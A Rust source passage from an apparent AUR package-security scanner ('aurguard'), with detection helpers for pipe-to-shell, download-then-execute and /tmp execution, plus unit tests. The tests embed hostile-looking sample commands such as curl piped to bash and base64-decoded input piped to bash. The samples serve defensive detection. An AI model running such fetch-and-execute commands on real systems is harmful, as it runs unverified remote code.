// ---------------------------------------------------------------------------
// Ignore directives + dedup
// ---------------------------------------------------------------------------

/// Drop findings suppressed by `[rules].ignore` (global) or inline
/// `# aurguard:ignore CODE[,CODE]` / `# aurguard:ignore-all` directives.
fn apply_ignores(text: &str, config: &Config, findings: &mut Vec<Finding>) {
    // line -> codes ignored on that line ("*" means all).
    let mut inline: HashMap<usize, Vec<String>> = HashMap::new();
    for (idx, raw) in text.lines().enumerate() {
        if let Some(codes) = parse_inline_ignore(raw) {
            inline.insert(idx + 1, codes);
        }
    }
    findings.retain(|f| {
        if config.ignores(f.code) {
            return false;
        }
        if let Some(line) = f.line {
            if let Some(codes) = inline.get(&line) {
                if codes
                    .iter()
                    .any(|c| c == "*" || c.eq_ignore_ascii_case(f.code))
                {
                    return false;
                }
            }
        }
        true
    });
}

/// Parse an inline ignore directive from a line, returning the suppressed
/// codes (or `["*"]` for ignore-all).
fn parse_inline_ignore(line: &str) -> Option<Vec<String>> {
    let pos = line.find("aurguard:ignore")?;
    let rest = line[pos + "aurguard:ignore".len()..].trim_start();
    if let Some(stripped) = rest.strip_prefix("-all") {
        let _ = stripped;
        return Some(vec!["*".into()]);
    }
    let codes: Vec<String> = rest
        .split([',', ' '])
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string())
        .collect();
    if codes.is_empty() {
        Some(vec!["*".into()])
    } else {
        Some(codes)
    }
}

/// Remove duplicate findings sharing the same `(code, line)`.
fn dedup(findings: &mut Vec<Finding>) {
    let mut seen = std::collections::HashSet::new();
    findings.retain(|f| seen.insert((f.code, f.line)));
}

// ---------------------------------------------------------------------------
// Lexical helpers
// ---------------------------------------------------------------------------

/// Strip a trailing unquoted `#` comment from a line.
fn strip_comment(line: &str) -> String {
    let mut in_single = false;
    let mut in_double = false;
    let mut out = String::with_capacity(line.len());
    for c in line.chars() {
        match c {
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '#' if !in_single && !in_double => break,
            _ => {}
        }
        out.push(c);
    }
    out
}

/// Whether `needle` appears as a standalone word in `hay`.
fn word_present(hay: &str, needle: &str) -> bool {
    hay.split(|c: char| !c.is_ascii_alphanumeric() && c != '_')
        .any(|w| w == needle)
}

/// Whether a command line pipes into a shell (textual fallback only).
fn pipes_to_shell(lower: &str) -> bool {
    if !lower.contains('|') {
        return false;
    }
    for seg in lower.split('|').skip(1) {
        let cmd = seg.split_whitespace().next().unwrap_or("");
        let cmd = cmd.rsplit('/').next().unwrap_or(cmd);
        if matches!(cmd, "bash" | "sh" | "zsh" | "dash" | "ksh") {
            return true;
        }
    }
    false
}

/// Return the file a `curl`/`wget` line writes to (`-o X`, `-O`, `> X`).
fn download_target(lower: &str) -> Option<String> {
    let tokens: Vec<&str> = lower.split_whitespace().collect();
    for (i, t) in tokens.iter().enumerate() {
        if (*t == "-o" || *t == "--output" || *t == ">") && i + 1 < tokens.len() {
            return Some(clean_name(tokens[i + 1]));
        }
        if let Some(rest) = t.strip_prefix("-o") {
            if !rest.is_empty() {
                return Some(clean_name(rest));
            }
        }
    }
    if let Some(pos) = lower.find('>') {
        if let Some(name) = lower[pos + 1..].split_whitespace().next() {
            return Some(clean_name(name));
        }
    }
    None
}

/// Normalize a filename token to a basename without quotes/leading `./`.
fn clean_name(s: &str) -> String {
    s.trim_matches(['"', '\'', '/', '.'])
        .rsplit('/')
        .next()
        .unwrap_or(s)
        .to_string()
}

/// If the line is `chmod +x <target>`, return the target basename.
fn chmod_exec_target(lower: &str) -> Option<String> {
    let trimmed = lower.trim_start();
    if !trimmed.starts_with("chmod") {
        return None;
    }
    if !(trimmed.contains("+x") || trimmed.contains("755")) {
        return None;
    }
    trimmed
        .split_whitespace()
        .last()
        .map(clean_name)
        .filter(|s| !s.is_empty())
}

/// Whether `lower` executes a file matching `target`.
fn executes_target(lower: &str, target: &str) -> bool {
    if target.is_empty() {
        return false;
    }
    let basename = target.rsplit('/').next().unwrap_or(target);
    lower.contains(&format!("./{basename}"))
        || lower.contains(&format!("bash {basename}"))
        || lower.contains(&format!("sh {basename}"))
        || lower
            .split_whitespace()
            .next()
            .map(|c| c.contains(basename))
            .unwrap_or(false)
}

/// Whether the line references `/tmp`.
fn mentions_tmp(lower: &str) -> bool {
    lower.contains("/tmp")
}

/// Whether the line writes/downloads into `/tmp`.
fn writes_to_tmp(lower: &str) -> bool {
    lower.contains("/tmp")
        && (lower.contains('>')
            || lower.contains("-o ")
            || lower.contains("--output")
            || lower.contains("cp ")
            || lower.contains("mv ")
            || lower.contains("tee "))
}

/// Whether the line executes something out of `/tmp`.
fn executes_from_tmp(lower: &str) -> bool {
    lower.contains("/tmp")
        && (lower.contains("bash /tmp")
            || lower.contains("sh /tmp")
            || lower.trim_start().starts_with("/tmp")
            || lower.contains("&& /tmp")
            || lower.contains("; /tmp"))
}

/// Host of the first URL in a line.
fn first_url_host(line: &str) -> Option<String> {
    for token in line.split([' ', '\t', '\'', '"']) {
        if let Some(src) = parse_url_token(token.trim(), 0) {
            if src.host.is_some() {
                return src.host;
            }
        }
    }
    None
}

/// Whether the script defines a shell function named `name`.
fn has_function(text: &str, name: &str) -> bool {
    text.lines().any(|l| {
        let t = l.trim_start();
        t.starts_with(&format!("{name}(")) || t.starts_with(&format!("{name} ("))
    })
}

/// Extract a shell function's body and its 1-based start line by brace-matching
/// from its `{`. Returns `None` if the function is absent or never opens.
fn function_body(text: &str, name: &str) -> Option<(String, usize)> {
    let mut lines = text.lines().enumerate();
    let (start, _) = lines.by_ref().find(|(_, l)| {
        let t = l.trim_start();
        t.starts_with(&format!("{name}(")) || t.starts_with(&format!("{name} ("))
    })?;

    let mut depth = 0i32;
    let mut started = false;
    let mut body = String::new();
    for raw in text.lines().skip(start) {
        for c in raw.chars() {
            match c {
                '{' => {
                    depth += 1;
                    started = true;
                }
                '}' => depth -= 1,
                _ => {}
            }
        }
        body.push_str(raw);
        body.push('\n');
        if started && depth <= 0 {
            break;
        }
    }
    Some((body, start + 1))
}

/// Whether the PKGBUILD declares an `install=` directive.
fn mentions_install_directive(text: &str) -> bool {
    text.lines().any(|l| l.trim_start().starts_with("install="))
}

/// Filenames of `.install` scriptlets referenced by the PKGBUILD.
///
/// Collects `install=<file>` directives (top-level and per-split-package) and
/// any bare `*.install` tokens, deduplicated. Used to fetch the extra files
/// that need analysis alongside the PKGBUILD.
pub fn referenced_install_files(text: &str) -> Vec<String> {
    let mut files = Vec::new();
    let mut push = |name: String| {
        let name = name.trim_matches(['"', '\'', ' ']).to_string();
        if !name.is_empty() && !files.contains(&name) {
            files.push(name);
        }
    };
    for raw in text.lines() {
        let line = strip_comment(raw);
        let t = line.trim_start();
        if let Some(rest) = t.strip_prefix("install=") {
            push(rest.to_string());
        } else if t.contains(".install") {
            for token in line.split([' ', '\t', '=', '(', ')', '"', '\'']) {
                if token.ends_with(".install") {
                    push(token.to_string());
                }
            }
        }
    }
    files
}

/// Line number of a `*sums=(...)` array containing a `SKIP` entry, if any.
fn skip_checksum_line(text: &str) -> Option<usize> {
    let mut in_sums = false;
    for (idx, line) in text.lines().enumerate() {
        let t = line.trim();
        let is_sum_start = t
            .split_once('=')
            .map(|(k, v)| k.ends_with("sums") && v.starts_with('('))
            .unwrap_or(false);
        if is_sum_start {
            in_sums = !t.contains(')');
            if t.contains("SKIP") {
                return Some(idx + 1);
            }
            continue;
        }
        if in_sums {
            if t.contains("SKIP") {
                return Some(idx + 1);
            }
            if t.contains(')') {
                in_sums = false;
            }
        }
    }
    None
}

/// Value of a simple `key=value` PKGBUILD field (first occurrence).
fn field_value(text: &str, key: &str) -> Option<String> {
    for line in text.lines() {
        let t = line.trim_start();
        if let Some(rest) = t.strip_prefix(&format!("{key}=")) {
            return Some(rest.trim_matches(['"', '\'']).to_string());
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Formatting helpers
// ---------------------------------------------------------------------------

/// Truncate a string for display, appending `…` when shortened.
fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        let kept: String = s.chars().take(max.saturating_sub(1)).collect();
        format!("{kept}…")
    }
}

/// Convert a Unix timestamp to an RFC3339 string, if valid.
fn ts_to_rfc3339(ts: i64) -> Option<String> {
    DateTime::<Utc>::from_timestamp(ts, 0).map(|d| d.to_rfc3339())
}

/// Human phrase like `"2 days ago"` for an event timestamp, localized.
fn humanize_since(ts: i64, now: DateTime<Utc>, lang: Lang) -> String {
    use crate::i18n::K;
    let Some(then) = DateTime::<Utc>::from_timestamp(ts, 0) else {
        return "?".into();
    };
    let days = (now - then).num_days();
    let (key, n) = match days {
        d if d < 0 => (K::Future, 0),
        0 => (K::Today, 0),
        1 => (K::DayAgo, 0),
        2..=30 => (K::DaysAgo, days),
        31..=60 => (K::MonthAgo, 0),
        61..=364 => (K::MonthsAgo, days / 30),
        365..=729 => (K::YearAgo, 0),
        _ => (K::YearsAgo, days / 365),
    };
    i18n::fill(i18n::t(lang, key), Some(&n.to_string()))
}

/// Human phrase for maintainer tenure, localized.
fn humanize_year(ts: i64, now: DateTime<Utc>, lang: Lang) -> String {
    use crate::i18n::K;
    let Some(then) = DateTime::<Utc>::from_timestamp(ts, 0) else {
        return "?".into();
    };
    let days = (now - then).num_days();
    if days < 365 {
        i18n::fill(
            i18n::t(lang, K::Since),
            Some(&humanize_since(ts, now, lang)),
        )
    } else {
        i18n::fill(
            i18n::t(lang, K::SinceYear),
            Some(&then.format("%Y").to_string()),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn pkg() -> PackageInfo {
        PackageInfo {
            name: "t".into(),
            version: "1.0-1".into(),
            maintainer: Some("m".into()),
            first_submitted: 1_200_000_000,
            last_modified: 1_700_000_000,
            num_votes: 100,
            out_of_date: None,
            url_path: None,
        }
    }

    fn now() -> DateTime<Utc> {
        DateTime::from_timestamp(1_705_000_000, 0).unwrap()
    }

    fn run(text: &str) -> Report {
        analyze(
            Some(&pkg()),
            &PkgSources::from_pkgbuild(text),
            &Config::default(),
            None,
            now(),
        )
    }

    fn codes(text: &str) -> Vec<&'static str> {
        run(text).findings.iter().map(|f| f.code).collect()
    }

    #[test]
    fn detects_eval() {
        assert!(codes("build() {\n  eval \"$payload\"\n}").contains(&"EVAL"));
    }

    #[test]
    fn orphan_and_outdated_metadata() {
        let mut m = pkg();
        m.maintainer = None;
        m.out_of_date = Some(1_690_000_000);
        let mut findings = Vec::new();
        scan_metadata(&m, now(), Lang::En, &mut findings);
        let codes: Vec<&str> = findings.iter().map(|f| f.code).collect();
        assert!(codes.contains(&"ORPHAN_PACKAGE"), "{codes:?}");
        assert!(codes.contains(&"FLAGGED_OUTDATED"), "{codes:?}");
    }

    #[test]
    fn maintained_current_package_has_no_orphan_flag() {
        let mut findings = Vec::new();
        scan_metadata(&pkg(), now(), Lang::En, &mut findings);
        let codes: Vec<&str> = findings.iter().map(|f| f.code).collect();
        assert!(!codes.contains(&"ORPHAN_PACKAGE"));
        assert!(!codes.contains(&"FLAGGED_OUTDATED"));
    }

    #[test]
    fn detects_curl_pipe_bash() {
        assert!(codes("build() {\n  curl https://x.io/i.sh | bash\n}").contains(&"CURL_PIPE_SH"));
    }

    #[test]
    fn detects_obfuscated_eval_in_pkgver() {
        // eval inside pkgver() body, AST still finds it.
        let text = "pkgver() {\n  eval \"$(echo whoami)\"\n}";
        assert!(codes(text).contains(&"EVAL"));
    }

    #[test]
    fn comment_eval_not_flagged() {
        assert!(!codes("build() {\n  : # eval here is harmless\n}").contains(&"EVAL"));
    }

    #[test]
    fn detects_base64_pipe_sh() {
        assert!(codes("  echo Zm9v | base64 -d | bash").contains(&"BASE64_PIPE_SH"));
    }

    #[test]
    fn detects_http_source() {
        assert!(codes("source=('http://example.org/x.tar.gz')").contains(&"INSECURE_SOURCE"));
    }

    #[test]
    fn detects_ip_source() {
        let c = codes("source=('http://1.2.3.4/x.tar.gz')");
        assert!(c.contains(&"IP_SOURCE"));
    }

    #[test]
    fn detects_chmod_then_exec() {
        assert!(codes("build() {\n  chmod +x ./run.sh\n  ./run.sh\n}").contains(&"CHMOD_EXEC"));
    }

    #[test]
    fn detects_download_then_exec() {
        let text = "build() {\n  curl https://x.io/r -o run.sh\n  bash run.sh\n}";
        assert!(codes(text).contains(&"DOWNLOAD_EXEC"));
    }

    #[test]
    fn skip_checksum_with_tarball_warns() {
        let text = "source=('https://github.com/u/r/v1.tar.gz')\nsha256sums=('SKIP')\n";
        assert!(codes(text).contains(&"CHECKSUM_SKIP"));
    }

    #[test]
    fn skip_checksum_with_only_vcs_is_clean() {
        let text = "source=('git+https://github.com/u/r.git')\nsha256sums=('SKIP')\n";
        assert!(!codes(text).contains(&"CHECKSUM_SKIP"));
    }

    #[test]
    fn https_github_source_is_clean() {
        let text =
            "source=('https://github.com/u/r/archive/v1.tar.gz')\nsha256sums=('abc')\npkgrel=1\n";
        assert_eq!(run(text).risk, Risk::Clean);
    }

    #[test]
    fn unknown_domain_warns() {
        let report = run("source=('https://unknown-site.ru/x.tar.gz')\nsha256sums=('abc')");
        assert!(report.findings.iter().any(|f| f.code == "UNKNOWN_SOURCE"));
    }

    #[test]
    fn config_extra_domain_trusted() {
        let mut cfg = Config::default();
        cfg.trust.extra_domains.push("my.corp".into());
        let report = analyze(
            Some(&pkg()),
            &PkgSources::from_pkgbuild("source=('https://git.my.corp/x.tar.gz')\nsha256sums=('a')"),
            &cfg,
            None,
            now(),
        );
        assert!(!report.findings.iter().any(|f| f.code == "UNKNOWN_SOURCE"));
    }

    #[test]
    fn config_ignore_suppresses() {
        let mut cfg = Config::default();
        cfg.rules.ignore.push("VCS_SOURCE".into());
        let report = analyze(
            Some(&pkg()),
            &PkgSources::from_pkgbuild("source=('git+https://github.com/u/r.git')"),
            &cfg,
            None,
            now(),
        );
        assert!(!report.findings.iter().any(|f| f.code == "VCS_SOURCE"));
    }

    #[test]
    fn inline_ignore_suppresses() {
        let text = "build() {\n  eval \"$x\" # aurguard:ignore EVAL\n}";
        assert!(!codes(text).contains(&"EVAL"));
    }

    #[test]
    fn install_script_eval_flagged() {
        let report = analyze(
            Some(&pkg()),
            &PkgSources {
                pkgbuild: "pkgname=t".into(),
                install_scripts: vec![(
                    "t.install".into(),
                    "post_install() {\n eval \"$x\"\n}".into(),
                )],
            },
            &Config::default(),
            None,
            now(),
        );
        assert!(report.findings.iter().any(|f| f.code == "EVAL"));
    }

    #[test]
    fn pkgbuild_changed_warns() {
        let sources = PkgSources::from_pkgbuild("pkgver=2");
        let report = analyze(
            Some(&pkg()),
            &sources,
            &Config::default(),
            Some("deadbeef"),
            now(),
        );
        assert!(report.findings.iter().any(|f| f.code == "PKGBUILD_CHANGED"));
    }

    #[test]
    fn local_analysis_without_metadata() {
        let report = analyze(
            None,
            &PkgSources::from_pkgbuild("pkgname=foo\npkgver=1.2\npkgrel=3\n"),
            &Config::default(),
            None,
            now(),
        );
        assert_eq!(report.package, "foo");
        assert_eq!(report.version, "1.2-3");
    }

    #[test]
    fn ip_literal_detection() {
        assert!(is_ip_literal("1.2.3.4"));
        assert!(!is_ip_literal("github.com"));
        assert!(!is_ip_literal("999.1.1.1"));
    }
}
